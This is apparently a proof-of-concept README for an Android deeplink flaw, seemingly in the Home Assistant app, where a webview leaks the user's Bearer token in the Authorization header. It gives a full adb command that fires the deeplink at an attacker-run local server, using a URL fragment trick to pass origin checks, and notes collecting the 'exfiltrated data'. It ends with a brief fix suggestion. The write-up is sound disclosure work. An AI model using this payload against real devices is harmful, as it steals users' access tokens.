# 5.1_Cookie_Leakage - Authorization Header Leak

## Vulnerability
Deeplink loadUrl attaches Bearer token in Authorization header

## Exploit
1. Start server: `python server.py`
2. Trigger deeplink:
```
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/5.1_Cookie_Leakage.html%23home-assistant.io"
```
3. Check `received/` for exfiltrated data

## Fixed Version
Implement proper origin validation, user confirmation dialogs, and restrict vulnerability scope.
